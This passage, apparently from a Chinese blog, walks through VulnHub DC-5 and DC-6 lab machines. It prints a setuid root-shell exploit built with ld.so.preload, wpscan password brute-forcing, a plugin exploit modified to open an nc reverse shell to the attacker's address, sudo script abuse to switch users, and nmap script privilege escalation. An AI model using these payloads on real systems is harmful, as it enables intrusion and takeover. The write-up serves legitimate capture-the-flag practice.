<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">locate cc1</span><br><span class="line"></span><br><span class="line"><span class="title class_">PATH</span>=<span class="string">&quot;$PATH&quot;</span><span class="symbol">:/usr/lib/gcc/x86_64-linux-gnu/</span><span class="number">4.9</span>/cc1</span><br><span class="line"></span><br><span class="line">export <span class="title class_">PATH</span></span><br></pre></td></tr></table></figure>



<p>然后我们从简，直接在靶机<code>shell</code>执行</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">cat &lt;&lt; EOF &gt; /tmp/libhax.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dropshell</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="built_in">chown</span>(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">chmod</span>(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">04755</span>);</span><br><span class="line">    <span class="built_in">unlink</span>(<span class="string">&quot;/etc/ld.so.preload&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span><br><span class="line">rm -f /tmp/libhax.c</span><br></pre></td></tr></table></figure>



<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">cat &lt;&lt; EOF &gt; <span class="regexp">/tmp/</span>rootshell.c</span><br><span class="line">#<span class="keyword">include</span> &lt;stdio.h&gt;</span><br><span class="line"><span class="keyword">int</span> main(<span class="keyword">void</span>)&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    seteuid(<span class="number">0</span>);</span><br><span class="line">    setegid(<span class="number">0</span>);</span><br><span class="line">    execvp(<span class="string">&quot;/bin/sh&quot;</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -o <span class="regexp">/tmp/</span>rootshell <span class="regexp">/tmp/</span>rootshell.c</span><br><span class="line">rm -f <span class="regexp">/tmp/</span>rootshell.c</span><br></pre></td></tr></table></figure>

<p>成功执行</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221002210611503.png"><img src="/vulnhub/image-20221002210611503.png" alt="image-20221002210611503"></a></p>
<h6 id="关键来了【期待】"><a href="#关键来了【期待】" class="headerlink" title="关键来了【期待】"></a>关键来了【期待】</h6><p>我们执行我们的<code>flag.sh</code>脚本【这里是重复的<code>flag.sh</code>，所以名字为<code>flag.sh.1</code>】</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221002211351948.png"><img src="/vulnhub/image-20221002211351948.png" alt="image-20221002211351948"></a></p>
<hr>
<p>终于解决问题后【卡了一天了】</p>
<p>终于成功提权</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221002211423172.png"><img src="/vulnhub/image-20221002211423172.png" alt="image-20221002211423172"></a></p>
<p>到<code>/root</code>目录下</p>
<p>拿到<code>flag</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221002211550887.png"><img src="/vulnhub/image-20221002211550887.png" alt="image-20221002211550887"></a></p>
<blockquote>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">888b</span>    <span class="number">888</span> d8b                                                      <span class="number">888</span>      <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> </span><br><span class="line"><span class="attribute">8888b</span>   <span class="number">888</span> Y8P                                                      <span class="number">888</span>      <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> </span><br><span class="line"><span class="attribute">88888b</span>  <span class="number">888</span>                                                          <span class="number">888</span>      <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> </span><br><span class="line"><span class="attribute">888Y88b</span> <span class="number">888</span> <span class="number">888</span>  .d8888b .d88b.       <span class="number">888</span>  <span class="number">888</span>  <span class="number">888</span>  .d88b.  <span class="number">888</span>d888 <span class="number">888</span>  <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> </span><br><span class="line"><span class="attribute">888</span> Y88b888 <span class="number">888</span> d88P<span class="string">&quot;   d8P  Y8b      888  888  888 d88&quot;</span><span class="string">&quot;88b 888P&quot;</span>   <span class="number">888</span> .<span class="number">88</span>P <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> </span><br><span class="line"><span class="attribute">888</span>  Y88888 <span class="number">888</span> <span class="number">888</span>     <span class="number">88888888</span>      <span class="number">888</span>  <span class="number">888</span>  <span class="number">888</span> <span class="number">888</span>  <span class="number">888</span> <span class="number">888</span>     <span class="number">888888</span>K  Y8P Y8P Y8P </span><br><span class="line"><span class="attribute">888</span>   Y8888 <span class="number">888</span> Y88b.   Y8b.          Y88b <span class="number">888</span> d88P Y88..<span class="number">88</span>P <span class="number">888</span>     <span class="number">888</span> <span class="string">&quot;88b  &quot;</span>   <span class="string">&quot;   &quot;</span>  </span><br><span class="line"><span class="attribute">888</span>    Y888 <span class="number">888</span>  <span class="string">&quot;Y8888P &quot;</span>Y8888        <span class="string">&quot;Y8888888P&quot;</span>   <span class="string">&quot;Y88P&quot;</span>  <span class="number">888</span>     <span class="number">888</span>  <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> <span class="number">888</span>                                                                                                                 </span><br></pre></td></tr></table></figure>


<p><code>Once again, a big thanks to all those who do these little challenges,</code><br><code>and especially all those who give me feedback - again, it&#39;s all greatly</code><br><code>appreciated.  :-)</code></p>
<p><code>I also want to send a big thanks to all those who find the vulnerabilities</code><br><code>and create the exploits that make these challenges possible.</code></p>
<p>翻译：                                                                                      </p>
<p>再次非常感谢所有完成这些小挑战的人，<br>尤其是所有给我反馈的人——再一次，这一切都很棒<br>赞赏。 :-)</p>
<p>我还要非常感谢所有发现漏洞的人<br>并创造使这些挑战成为可能的漏洞。</p>
</blockquote>
<p><code>吐血了，果然是中级，顺便提醒一下大家，非必要不要更新</code></p>
<p><strong>一个旗子找完，游戏结束【吐血了】</strong></p>
<hr>
<h1 id="六、DC-6-中级"><a href="#六、DC-6-中级" class="headerlink" title="六、DC-6[中级]"></a>六、DC-6[中级]</h1><p><strong>only one flag</strong></p>
<h2 id="信息收集-5"><a href="#信息收集-5" class="headerlink" title="信息收集"></a>信息收集</h2><p>先抬手<code>nmap</code>扫描一下</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221006214334035.png"><img src="/vulnhub/image-20221006214334035.png" alt="image-20221006214334035"></a></p>
<blockquote>
<p>发现<br><code>22</code>端口：运行着<code>ssh</code>【默认端口】<br><code>80</code>端口：运行着<code>http</code>【默认端口】</p>
</blockquote>
<p>看来可能是需要<code>ssh</code>连接拿<code>shell</code></p>
<hr>
<p>这个靶机好像需要配置<code>hosts</code>文件，不然通过<code>ip</code>是访问不了网站的</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221006215651658.png"><img src="/vulnhub/image-20221006215651658.png" alt="image-20221006215651658"></a></p>
<p>然后访问试试</p>
<p>好了【但是好像有点卡】</p>
<p>界面和<code>DC2</code>一样【梦回<code>DC2</code>，操作应该差不多】</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221006220758221.png"><img src="/vulnhub/image-20221006220758221.png" alt="image-20221006220758221"></a></p>
<hr>
<p>习惯看看<code>wappalyzer</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221006221445685.png"><img src="/vulnhub/image-20221006221445685.png" alt="image-20221006221445685"></a></p>
<p>看到<code>CMS</code>是<code>WordPress 5.1.1</code></p>
<p>想到可以利用一下这个版本的漏洞，拿到一些敏感信息</p>
<hr>
<p>我们再看看网站上有没有可以利用的信息</p>
<p><code>about us</code>里似乎全是文本内容没啥提示</p>
<p>看到有个<code>concact us</code>，可能有交互利用的地方</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221006222942930.png"><img src="/vulnhub/image-20221006222942930.png" alt="image-20221006222942930"></a></p>
<p>虽然看起来没有但是其实是有的</p>
<p>通过<code>concact us</code>页面的url，在后面加上用户的名字就可以</p>
<blockquote>
<p><code>http://xxx/admin</code>  </p>
<p>&#x2F;&#x2F;当然其实并不太重要，不过可以试试看，能不能留言xss然后挟持管理员账户，不过这并不是实际情况，所以可以自己留言，然后登录看看</p>
</blockquote>
<hr>
<h2 id="1-wpscan爆破出用户名【dc2里搞过】"><a href="#1-wpscan爆破出用户名【dc2里搞过】" class="headerlink" title="1.wpscan爆破出用户名【dc2里搞过】"></a>1.wpscan爆破出用户名【dc2里搞过】</h2><p>看到<code>wordpress</code>先用<code>wpscan</code>搞一下</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan <span class="comment">--url wordy -e u</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221006235057457.png"><img src="/vulnhub/image-20221006235057457.png" alt="image-20221006235057457"></a></p>
<p>得到用户名</p>
<blockquote>
<p><code>admin</code><br><code>mark</code><br><code>graham</code><br><code>sarah</code><br><code>jens</code></p>
</blockquote>
<p>我们创建一个<code>user.txt</code></p>
<p>哪在哪里登录呢？我们在开始页面并没有看到登录窗口</p>
<p>我们用<code>dirb</code>扫一下</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http:<span class="comment">//wordy</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221009231112282.png"><img src="/vulnhub/image-20221009231112282.png" alt="image-20221009231112282"></a></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>wordy<span class="regexp">/wp-admin/</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221009231340911.png"><img src="/vulnhub/image-20221009231340911.png" alt="image-20221009231340911"></a></p>
<hr>
<h2 id="2-wpscan爆破密码"><a href="#2-wpscan爆破密码" class="headerlink" title="2.wpscan爆破密码"></a>2.wpscan爆破密码</h2><p>我们再找一个密码表，这里用和<code>DC2</code> <code>cewl</code>命令爬一下网站，看看能不能利用其中有没有密码</p>
<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl wordy &gt; <span class="keyword">pass</span>.txt  </span><br></pre></td></tr></table></figure>

<p>然后就得到一个密码【擦，难道和<code>dc2</code>一样的】</p>
<p>然后我们开始进行爆破登录【注意需要<code>root</code>权限】</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan <span class="attr">--url</span> wordy <span class="attr">--usernames</span> user<span class="selector-class">.txt</span> <span class="attr">--passwords</span> pass<span class="selector-class">.txt</span>                             </span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221009231928764.png"><img src="/vulnhub/image-20221009231928764.png" alt="image-20221009231928764"></a></p>
<p>结果肯定是不行的【肯定不和<code>DC2</code>一样】</p>
<p>&#x3D;&#x3D;&gt;</p>
<p>所以这里我们需要找一个<strong>完整的密码字典</strong></p>
<blockquote>
<p>需要用到<code>wordpress</code>的密码字典，kali自带<code>rockyou.txt</code></p>
</blockquote>
<p>由作者提示得【也就是把密码一部分告诉你了】</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221113171203270.png"><img src="/vulnhub/image-20221113171203270.png" alt="image-20221113171203270"></a></p>
<blockquote>
<p><code>wpscan --url http://wordy --usernames user.txt --passwords /usr/share/wordlists/rockyou.txt|grep k01 -t 5</code></p>
<p>&#x2F;&#x2F;-t是添加线程数，默认是5，多加几个可以更快一些</p>
</blockquote>
<p>如果直接跑的有点久了</p>
<p><code>。。。。。。。【睡了一晚上，不知道好久跑出来的】</code></p>
<p><code>【七千万密码】</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221010225451565.png"><img src="/vulnhub/image-20221010225451565.png" alt="image-20221010225451565"></a></p>
<p>最后得到</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221010230354224.png"><img src="/vulnhub/image-20221010230354224.png" alt="image-20221010230354224"></a></p>
<blockquote>
<p>username:<code>mark</code><br>password:<code>helpdesk01</code></p>
</blockquote>
<p>虽然只有一个用户但是够了</p>
<hr>
<h2 id="3-登录网站找信息"><a href="#3-登录网站找信息" class="headerlink" title="3.登录网站找信息"></a>3.登录网站找信息</h2><p>登录后发现是一个<code>wordpress</code>的后台网站</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221010231254865.png"><img src="/vulnhub/image-20221010231254865.png" alt="image-20221010231254865"></a></p>
<p>在左侧我们发现了一个新的东西叫做</p>
<p><code>Activity monitor</code></p>
<blockquote>
<p>是一款网站用户活动监控插件，我们用户登录的ip和其他信息都会被监控</p>
<p>&#x2F;&#x2F;那么我们是不是可以试试找找这个插件有没有漏洞，从而通过这个漏洞拿到shell或者其他更高权限用户的信息</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221010231223449.png"><img src="/vulnhub/image-20221010231223449.png" alt="image-20221010231223449"></a></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221010231622962.png"><img src="/vulnhub/image-20221010231622962.png" alt="image-20221010231622962"></a></p>
<p>我们查一下</p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit activity <span class="literal">monitor</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221010231725009.png"><img src="/vulnhub/image-20221010231725009.png" alt="image-20221010231725009"></a></p>
<p>发现果然是有的，只是不知道能不能利用</p>
<p>我们主要找后面两个和<code>wordpress</code>相关的</p>
<blockquote>
<p><code>45274.html</code>是命令注入<br><code>50110.py</code>是远程命令执行</p>
</blockquote>
<h3 id="1）50110-py【有问题，不建议用】"><a href="#1）50110-py【有问题，不建议用】" class="headerlink" title="1）50110.py【有问题，不建议用】"></a>1）50110.py【有问题，不建议用】</h3><p>感觉<code>py</code>更方便一些，我们先查看内容</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat <span class="regexp">/usr/</span>share<span class="regexp">/exploitdb/</span>exploits<span class="regexp">/php/</span>webapps/<span class="number">50110</span>.py</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221010232311464.png"><img src="/vulnhub/image-20221010232311464.png" alt="image-20221010232311464"></a></p>
<p>看来只需要<code>ip</code>，以及<code>用户名</code>和<code>密码</code>即可进入<code>shell</code></p>
<p>我们运行一下</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python <span class="regexp">/usr/</span>share<span class="regexp">/exploitdb/</span>exploits<span class="regexp">/php/</span>webapps/<span class="number">50110</span>.py</span><br></pre></td></tr></table></figure>



<p>然后我按我的输入</p>
<blockquote>
<p><code>192.168.133.145</code><br><code>mark</code><br><code>helpdesk01</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221010232611030.png"><img src="/vulnhub/image-20221010232611030.png" alt="image-20221010232611030"></a></p>
<p>进入<code>shell</code></p>
<hr>
<p>然后固定姿势，进入交互式<code>shell</code></p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure>

<p>但是会报错</p>
<p>似乎不能使用<code>python</code>命令，一使用就退出<code>shell</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221010233037169.png"><img src="/vulnhub/image-20221010233037169.png" alt="image-20221010233037169"></a></p>
<p>那就看起来有点难受了，再试试能不能进入稳定<code>shell</code></p>
<blockquote>
<p>先<br><code>ctrl+z</code><br>然后执行<br><code>stty raw -echo ; fg ; reset</code>  </p>
</blockquote>
<p>结果卡死了</p>
<p>算了算了，就这样看吧</p>
<p>【我这里把<code>py</code>脚本导入一个新的文件里（<code>1.py</code>），把我的ip，用户名，密码都写了进去，就不用退出了又重新输入了】</p>
<hr>
<p>先退到主目录看看有几个用户</p>
<p>但是发现好像有点问题，似乎有的命令执行就和脚本冲突，那就用</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221010234544191.png"><img src="/vulnhub/image-20221010234544191.png" alt="image-20221010234544191"></a></p>
<h3 id="2）45274-html"><a href="#2）45274-html" class="headerlink" title="2）45274.html"></a>2）45274.html</h3><p>那我们先不管它，我们还有一个命令注入的没有用，</p>
<p>我们先查看一下内容</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat <span class="regexp">/usr/</span>share<span class="regexp">/exploitdb/</span>exploits<span class="regexp">/php/</span>webapps/<span class="number">45274</span>.html</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221011113959660.png"><img src="/vulnhub/image-20221011113959660.png" alt="image-20221011113959660"></a></p>
<p>我们把这个文件导入一个新文件中【1.html】</p>
<p>主要是修改这里的网站网址和监听本地<code>ip</code>，改成我们的<code>wordy</code>和<code>kali</code>机的<code>ip</code></p>
<figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:<span class="number">8000</span>/wp-<span class="literal">admin</span>/<span class="literal">admin</span>.php?<span class="keyword">page</span>=plainview_activity_monitor&amp;tab=activity_tools</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line">http://wordy/wp-<span class="literal">admin</span>/<span class="literal">admin</span>.php?<span class="keyword">page</span>=plainview_activity_monitor&amp;tab=activity_tools</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221011115438911.png"><img src="/vulnhub/image-20221011115438911.png" alt="image-20221011115438911"></a></p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nlvp <span class="number">127.0</span>.<span class="number">0.1</span>   <span class="operator">=</span><span class="operator">=</span>&gt;   nc <span class="number">192.168</span>.<span class="number">133.140</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221011114105820.png"><img src="/vulnhub/image-20221011114105820.png" alt="image-20221011114105820"></a></p>
<p>然后因为是<code>html</code>文件，我们可以直接用浏览器打开，</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221011114637014.png"><img src="/vulnhub/image-20221011114637014.png" alt="image-20221011114637014"></a></p>
<p>当然也可以</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">python</span> -m http.server <span class="number">8008</span></span><br></pre></td></tr></table></figure>

<p>然后以浏览器方式访问本地<code>ip:8008</code>，再打开里面<code>1.html</code>文件</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221011114825111.png"><img src="/vulnhub/image-20221011114825111.png" alt="image-20221011114825111"></a></p>
<h4 id="nc监听拿shell"><a href="#nc监听拿shell" class="headerlink" title="nc监听拿shell"></a>nc监听拿shell</h4><p>然后我们发现有个</p>
<p><code>Submit request</code>的按钮，看来是发送请求，然后<code>nc</code>反弹shell</p>
<blockquote>
<p>注意监听端口是<code>9999</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221011115108761.png"><img src="/vulnhub/image-20221011115108761.png" alt="image-20221011115108761"></a></p>
<p>然后我们在浏览器点击一下<code>Submit request</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221011122029894.png"><img src="/vulnhub/image-20221011122029894.png" alt="image-20221011122029894"></a></p>
<p>连接到 <code>shell</code></p>
<p>这个比脚本的那个就更加方便一下了，</p>
<hr>
<p>固定姿势</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure>

<p>然后进入稳定式shell</p>
<blockquote>
<p>先<code>ctrl+z</code><br>然后执行<br><code>stty raw -echo ; fg ; reset</code>  </p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221011122301709.png"><img src="/vulnhub/image-20221011122301709.png" alt="image-20221011122301709"></a></p>
<hr>
<p>然后开始找找有没有其他用户的密码信息</p>
<p>先到 <code>/home</code> 里查看一下，发现了除了<code>admin</code>其他三个用户目录</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221011122438174.png"><img src="/vulnhub/image-20221011122438174.png" alt="image-20221011122438174"></a></p>
<p>我们先进我们登录成功的<code>mark</code>目录查看</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221011122638708.png"><img src="/vulnhub/image-20221011122638708.png" alt="image-20221011122638708"></a></p>
<p>发现有个<code>things-to-do.txt</code>文本文件</p>
<p>查看内容</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cat</span> things-<span class="keyword">to</span>-<span class="keyword">do</span>.txt</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221011122741660.png"><img src="/vulnhub/image-20221011122741660.png" alt="image-20221011122741660"></a></p>
<blockquote>
<p><code>Things to do:</code></p>
<ul>
<li><code>Restore full functionality for the hyperdrive (need to speak to Jens)</code></li>
<li><code>Buy present for Sarah&#39;s farewell party</code></li>
<li><code>Add new user: graham - GSo7isUM1D4 - done</code></li>
<li><code>Apply for the OSCP course</code></li>
<li><code>Buy new laptop for Sarah&#39;s replacement</code></li>
</ul>
<p>意思是：</p>
<p>要做的事情：</p>
<ul>
<li>恢复超光速引擎的全部功能（需要与 Jens 交谈）</li>
<li>为莎拉的告别派对购买礼物</li>
<li>添加新用户：graham - GSo7isUM1D4 - 完成</li>
<li>申请OSCP课程</li>
<li>为莎拉购买新的笔记本电脑</li>
</ul>
<p>&#x2F;&#x2F;关键信息我们得到了graham用户的密码【我也想考OSCP，哭唧唧】</p>
</blockquote>
<p>我们根据我们拿到<code>graham</code>的信息，登录<code>ssh</code></p>
<p>【当然在原有<code>shell</code>里利用<code>su</code>命令切换用户<code>graham</code>也是可以的，但是<code>ssh</code>有颜色，看起来好看一些】</p>
<p>【因为之前就看到运行着<code>ssh</code>，没必要再在登录一次网站，反正不是最高权限】</p>
<blockquote>
<p><code>ssh graham@192.168.133.145 -p 22</code>    &#x2F;&#x2F;靶机ip  ssh运行端口<br>密码：<code>GSo7isUM1D4</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221011123625279.png"><img src="/vulnhub/image-20221011123625279.png" alt="image-20221011123625279"></a></p>
<p>然后我们看看我们有哪些命令可以执行</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo -l</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221011124153885.png"><img src="/vulnhub/image-20221011124153885.png" alt="image-20221011124153885"></a></p>
<p>看到是有<code>jens</code>目录下一个脚本文件的运行权限，而且不需要<code>jens</code>的密码，就可以他的身份下运行了【<code>mark</code>我试了的，没有权限】</p>
<h4 id="以其他用户身份运行脚本，实现切换用户"><a href="#以其他用户身份运行脚本，实现切换用户" class="headerlink" title="以其他用户身份运行脚本，实现切换用户"></a>以其他用户身份运行脚本，实现切换用户</h4><p>我们先查看一下内容</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /home/jens/backups.sh</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221011124824445.png"><img src="/vulnhub/image-20221011124824445.png" alt="image-20221011124824445"></a></p>
<p>发现是执行一些命令，</p>
<p>但是我们的目的想获得<code>jens</code>的登录权限，我们在脚本文件中追加一些命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/bin/bash&quot;</span>  &gt;&gt; /home/jens/backups.sh</span><br></pre></td></tr></table></figure>

<p>这样的话当我们以<code>jens</code>身份运行这个脚本时，当执行<code>/bin/bash</code>时，就算我们现在是<code>graham</code>，也会切换成<code>jens</code>，这也得益于可以<code>nopasswd</code>运行</p>
<blockquote>
<p><code>sudo -u jens /home/jens/backups.sh</code></p>
<p>&#x2F;&#x2F;注意哦，这里是需要以<code>jens</code>身份运行【毕竟他给了我们用他身份执行权限】才可以实现切换用户，如果直接运行还是<code>graham</code>用户，就如下图一样</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221011125910796.png"><img src="/vulnhub/image-20221011125910796.png" alt="image-20221011125910796"></a></p>
<p>切换用户成功，</p>
<p>我们先看看<code>jens</code>有哪些命令可以执行</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo -l</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221011130314044.png"><img src="/vulnhub/image-20221011130314044.png" alt="image-20221011130314044"></a></p>
<p>终于，发现了<code>root</code>的，我们可以执行<code>nmap</code>命令【只有管理员可以】，那么如何拿到权限呢</p>
<h2 id="4-nmap提权"><a href="#4-nmap提权" class="headerlink" title="4.nmap提权"></a>4.nmap提权</h2><h3 id="1-旧版"><a href="#1-旧版" class="headerlink" title="1.旧版"></a>1.旧版</h3><p>nmap（2.02-5.21）存在交换模式，可利用提权</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="comment">--interactive</span></span><br></pre></td></tr></table></figure>

<p>之后执行:</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nmap</span>&gt; !sh</span><br><span class="line"><span class="attribute">sh</span>-<span class="number">3</span>.<span class="number">2</span># whoami</span><br><span class="line"><span class="attribute">root</span></span><br></pre></td></tr></table></figure>

<p>msf中的模块为：</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/unix/<span class="keyword">local</span>/setuid_nmap</span><br></pre></td></tr></table></figure>

<h3 id="2-新版"><a href="#2-新版" class="headerlink" title="2.新版"></a>2.新版</h3><p>较新版可使用 <code>--script</code> 参数：</p>
<blockquote>
<p>先写入一条命令<br><code>echo &quot;os.execute(&#39;/bin/sh&#39;)&quot; &gt; getshell</code><br>再–script参数，执行<br><code>sudo nmap --script=getshell</code></p>
</blockquote>
<p>查看一下靶机的<code>nmap</code>版本</p>
<p><code>7.4</code>还是挺高的</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221011131514173.png"><img src="/vulnhub/image-20221011131514173.png" alt="image-20221011131514173"></a></p>
<p>那我们写一个脚本，里面加上命令，再用新版<code>nmap</code>运行这个脚本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;os.execute(&#x27;/bin/sh&#x27;)&quot;</span> &gt; getshell</span><br></pre></td></tr></table></figure>



<blockquote>
<p>注意哈，<code>jens</code>只有在<code>~</code>目录下才可以执行<code>echo</code>命令，不然是不可以的</p>
</blockquote>
